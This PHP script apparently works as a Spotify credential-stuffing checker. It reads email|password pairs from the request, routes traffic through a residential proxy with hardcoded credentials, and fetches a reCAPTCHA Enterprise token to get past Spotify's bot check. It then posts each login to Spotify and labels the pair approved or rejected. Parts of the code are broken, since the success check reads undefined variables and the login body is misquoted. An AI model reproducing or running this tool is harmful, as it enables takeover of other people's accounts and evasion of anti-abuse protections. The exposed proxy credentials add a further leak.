
<?php
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');
 
 
function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
 
function getStr2($dado, $string, $string2){ // FUNCTION QUE PUXA UM VALOR INDEFINIDO ENTRE DUAS STRINGS QUE NรO MUDAM.
  preg_match_all("($string(.*)$string2)siU", $dado, $match1);
  return $match1[1][0];
 
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$email  = $separar[0];
$senha = $separar[1];
 
 
$username = 'blue3419ankj16047'; 
$password = 'ku9VsvUjT7gv7oOx_country-Italy'; 
$proxy = 'isp2.hydraproxy.com:9989';


$email = urlencode($email);
$senha = urlencode($senha);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=pt-BR&v=FDTCuNjXhn1sV0lk31aK53uB&size=invisible&cb=5dhqmqqdjbz8');  	
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: www.google.com',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
  'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
  'Accept-Encoding: gzip, deflate, br',
  'Connection: keep-alive',
  'Referer: https://accounts.spotify.com/',
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$d1 = curl_exec($ch);
$RecaptchaToken = getStr($d1, '<input type="hidden" id="recaptcha-token" value="', '">');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.google.com/recaptcha/enterprise/reload?k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: www.google.com',
  'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
  'Accept: */*',
  'Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
  'Accept-Encoding: gzip, deflate, br',
  'Content-Type: application/x-protobuffer',
  'Origin: https://www.google.com',
  'Connection: keep-alive',
  'Referer: https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=pt-BR&v=FDTCuNjXhn1sV0lk31aK53uB&size=invisible&cb=5dhqmqqdjbz8',
      ));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "v=FDTCuNjXhn1sV0lk31aK53uB&reason=q&c=$RecaptchaToken&k=6LfCVLAUAAAAALFwwRnnCJ12DalriUGbj8FW_J39&co=aHR0cHM6Ly9hY2NvdW50cy5zcG90aWZ5LmNvbTo0NDM.&hl=en&size=invisible&chr=%5B89%2C64%2C27%5D&vh=13599012192&bg=!q62grYxHRvVxjUIjSFNd0mlvrZ-iCgIHAAAB6FcAAAANnAkBySdqTJGFRK7SirleWAwPVhv9-XwP8ugGSTJJgQ46-0IMBKN8HUnfPqm4sCefwxOOEURND35prc9DJYG0pbmg_jD18qC0c-lQzuPsOtUhHTtfv3--SVCcRvJWZ0V3cia65HGfUys0e1K-IZoArlxM9qZfUMXJKAFuWqZiBn-Qi8VnDqI2rRnAQcIB8Wra6xWzmFbRR2NZqF7lDPKZ0_SZBEc99_49j07ISW4X65sMHL139EARIOipdsj5js5JyM19a2TCZJtAu4XL1h0ZLfomM8KDHkcl_b0L-jW9cvAe2K2uQXKRPzruAvtjdhMdODzVWU5VawKhpmi2NCKAiCRUlJW5lToYkR_X-07AqFLY6qi4ZbJ_sSrD7fCNNYFKmLfAaxPwPmp5Dgei7KKvEQmeUEZwTQAS1p2gaBmt6SCOgId3QBfF_robIkJMcXFzj7R0G-s8rwGUSc8EQzT_DCe9SZsJyobu3Ps0-YK-W3MPWk6a69o618zPSIIQtSCor9w_oUYTLiptaBAEY03NWINhc1mmiYu2Yz5apkW_KbAp3HD3G0bhzcCIYZOGZxyJ44HdGsCJ-7ZFTcEAUST-aLbS-YN1AyuC7ClFO86CMICVDg6aIDyCJyIcaJXiN-bN5xQD_NixaXatJy9Mx1XEnU4Q7E_KISDJfKUhDktK5LMqBJa-x1EIOcY99E-eyry7crf3-Hax3Uj-e-euzRwLxn2VB1Uki8nqJQVYUgcjlVXQhj1X7tx4jzUb0yB1TPU9uMBtZLRvMCRKvFdnn77HgYs5bwOo2mRECiFButgigKXaaJup6NM4KRUevhaDtnD6aJ8ZWQZTXz_OJ74a_OvPK9eD1_5pTG2tUyYNSyz-alhvHdMt5_MAdI3op4ZmcvBQBV9VC2JLjphDuTW8eW_nuK9hN17zin6vjEL8YIm_MekB_dIUK3T1Nbyqmyzigy-Lg8tRL6jSinzdwOTc9hS5SCsPjMeiblc65aJC8AKmA5i80f-6Eg4BT305UeXKI3QwhI3ZJyyQAJTata41FoOXl3EF9Pyy8diYFK2G-CS8lxEpV7jcRYduz4tEPeCpBxU4O_KtM2iv4STkwO4Z_-c-fMLlYu9H7jiFnk6Yh8XlPE__3q0FHIBFf15zVSZ3qroshYiHBMxM5BVQBOExbjoEdYKx4-m9c23K3suA2sCkxHytptG-6yhHJR3EyWwSRTY7OpX_yvhbFri0vgchw7U6ujyoXeCXS9N4oOoGYpS5OyFyRPLxJH7yjXOG2Play5HJ91LL6J6qg1iY8MIq9XQtiVZHadVpZVlz3iKcX4vXcQ3rv_qQwhntObGXPAGJWEel5OiJ1App7mWy961q3mPg9aDEp9VLKU5yDDw1xf6tOFMwg2Q-PNDaKXAyP_FOkxOjnu8dPhuKGut6cJr449BKDwbnA9BOomcVSztEzHGU6HPXXyNdZbfA6D12f5lWxX2B_pobw3a1gFLnO6mWaNRuK1zfzZcfGTYMATf6d7sj9RcKNS230XPHWGaMlLmNxsgXkEN7a9PwsSVwcKdHg_HU4vYdRX6vkEauOIwVPs4dS7yZXmtvbDaX1zOU4ZYWg0T42sT3nIIl9M2EeFS5Rqms_YzNp8J-YtRz1h5RhtTTNcA5jX4N-xDEVx-vD36bZVzfoMSL2k85PKv7pQGLH-0a3DsR0pePCTBWNORK0g_RZCU_H898-nT1syGzNKWGoPCstWPRvpL9cnHRPM1ZKemRn0nPVm9Bgo0ksuUijgXc5yyrf5K49UU2J5JgFYpSp7aMGOUb1ibrj2sr-D63d61DtzFJ2mwrLm_KHBiN_ECpVhDsRvHe5iOx_APHtImevOUxghtkj-8RJruPgkTVaML2MEDOdL_UYaldeo-5ckZo3VHss7IpLArGOMTEd0bSH8tA8CL8RLQQeSokOMZ79Haxj8yE0EAVZ-k9-O72mmu5I0wH5IPgapNvExeX6O1l3mC4MqLhKPdOZOnTiEBlSrV4ZDH_9fhLUahe5ocZXvXqrud9QGNeTpZsSPeIYubeOC0sOsuqk10sWB7NP-lhifWeDob-IK1JWcgFTytVc99RkZTjUcdG9t8prPlKAagZIsDr1TiX3dy8sXKZ7d9EXQF5P_rHJ8xvmUtCWqbc3V5jL-qe8ANypwHsuva75Q6dtqoBR8vCE5xWgfwB0GzR3Xi_l7KDTsYAQIrDZVyY1UxdzWBwJCrvDrtrNsnt0S7BhBJ4ATCrW5VFPqXyXRiLxHCIv9zgo-NdBZQ4hEXXxMtbem3KgYUB1Rals1bbi8X8MsmselnHfY5LdOseyXWIR2QcrANSAypQUAhwVpsModw7HMdXgV9Uc-HwCMWafOChhBr88tOowqVHttPtwYorYrzriXNRt9LkigESMy1bEDx79CJguitwjQ9IyIEu8quEQb_-7AEXrfDzl_FKgASnnZLrAfZMtgyyddIhBpgAvgR_c8a8Nuro-RGV0aNuunVg8NjL8binz9kgmZvOS38QaP5anf2vgzJ9wC0ZKDg2Ad77dPjBCiCRtVe_dqm7FDA_cS97DkAwVfFawgce1wfWqsrjZvu4k6x3PAUH1UNzQUxVgOGUbqJsaFs3GZIMiI8O6-tZktz8i8oqpr0RjkfUhw_I2szHF3LM20_bFwhtINwg0rZxRTrg4il-_q7jDnVOTqQ7fdgHgiJHZw_OOB7JWoRW6ZlJmx3La8oV93fl1wMGNrpojSR0b6pc8SThsKCUgoY6zajWWa3CesX1ZLUtE7Pfk9eDey3stIWf2acKolZ9fU-gspeACUCN20EhGT-HvBtNBGr_xWk1zVJBgNG29olXCpF26eXNKNCCovsILNDgH06vulDUG_vR5RrGe5LsXksIoTMYsCUitLz4HEehUOd9mWCmLCl00eGRCkwr9EB557lyr7mBK2KPgJkXhNmmPSbDy6hPaQ057zfAd5s_43UBCMtI-aAs5NN4TXHd6IlLwynwc1zsYOQ6z_HARlcMpCV9ac-8eOKsaepgjOAX4YHfg3NekrxA2ynrvwk9U-gCtpxMJ4f1cVx3jExNlIX5LxE46FYIhQ");
$d2 = curl_exec($ch);
echo $d2;
$rresp = getStr($d2, '["rresp","', '"');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/en/login");  	
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
  "Pragma: no-cache",
  "Accept: */*",
));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
$d3 = curl_exec($ch);
$sp_fid = getStr($d3, 'set-cookie: __HOST-sp_fid=', ';');
$device_id = getStr($d3, 'set-cookie: __Host-device_id=', ';');
$SECURE_TPASESSION = getStr($d3, 'set-cookie: __Secure-TPASESSION=', ';');
$csrf_token = getStr($d3, 'set-cookie: csrf_token=', ';');


$characterCount = strlen ('remember=true&continue=https%3A%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F&username='.$email.'&password='.$senha.'&recaptchaToken='.$rresp.'&csrf_token='.$csrf_token.'');
  echo $characterCount;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://accounts.spotify.com/login/password");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  "Host: accounts.spotify.com",
  "Connection: keep-alive",
  "Content-Length: $characterCount",
  "Accept: application/json, text/plain, */*",
  "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36",
  "Content-Type: application/x-www-form-urlencoded",
  "Origin: https://accounts.spotify.com",
  "Sec-Fetch-Site: same-origin",
  "Sec-Fetch-Mode: cors",
  "Sec-Fetch-Dest: empty",
  "Referer: https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F",
 //"Accept-Encoding: gzip, deflate, br",
  "Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
  "Cookie: __HOST-sp_fid=$sp_fid; __Host-device_id=$device_id; __Secure-TPASESSION=$SECURE_TPASESSION; _ga=GA1.2.356575421.1624295477; _gid=GA1.2.1797873232.1624295477; csrf_token=$csrf_token; __bon=MHwwfDI2Nzk4NDgzNXwxMTI1NTM2MzA3MHwxfDF8MXwx; remember=$email",
      ));
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "remember=true&continue=https%3A%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F&username='.$email.''&password='.$senha.'&recaptchaToken=$rresp&csrf_token=$csrf_token");
$d4 = curl_exec($ch);
echo $d4;



//set-cookie: csrf_token=AQCucrSpEemwLKdw2PROVa7aNxVlXWa1sDcP6Fme8v1aFbCR9zYtUyJ4HE0VSvCms9QicUakAm3Gkcd1;


/*
preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $data, $matches);
$cookies = array();
foreach($matches[1] as $item) {
parse_str($item, $cookie);
$cookies = array_merge($cookies, $cookie); }
 $token = $cookies['csrf_token'];
 $bon_cookie = base64_encode("0|0|0|0|1|1|1|1");
*/


/*
$sp_fid = getStr($data, 'set-cookie: __HOST-sp_fid=', ';');
$device_id = getStr($data, 'set-cookie: __Host-device_id=', ';');
$TPASESSION = getStr($data, 'set-cookie: __Secure-TPASESSION=', ';');
$csrf_token = getStr($data, 'set-cookie: csrf_token=', ';');
*/





$erro = getStr2($data, '<li>','\/li>",');
$erro = str_replace("\n", "", $erro);

     if(stristr($data2,'Seus dados') !== false){
        echo '  
<div class="alert alert-fixed alert-success alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-check"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Aprovada </strong> '.$email.'|'.$senha.' → Nome: '.$nome.' | Sobrenome: '.$sobrenome.' | Telefone: '.$telefone.' | Cidade: '.$cidade.'/'.$estado.'  <strong></strong></p>
                                  </div>
 
                         
  </div>
                                </div>
                                 
';
	 }
	
else{ //
 echo '             
<div class="alert alert-fixed alert-danger alert-dismissible" role="alert">
                                  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only"></span></button>
                                  <div class="alert__icon pull-left" >
                                    <i class="pe-7s-close-circle"></i>
                                  </div>
                                  <div class="text-center">
                                  <p class="alert__text"><strong>#Reprovada </strong> '.$email.'|'.$senha.' Retorno → '.$return.' <strong> </strong></p>
                                  </div>
 
                         
  </div>
                                </div>
                                 
';
	 }

curl_close($ch);
 ob_flush();        
                             
?>
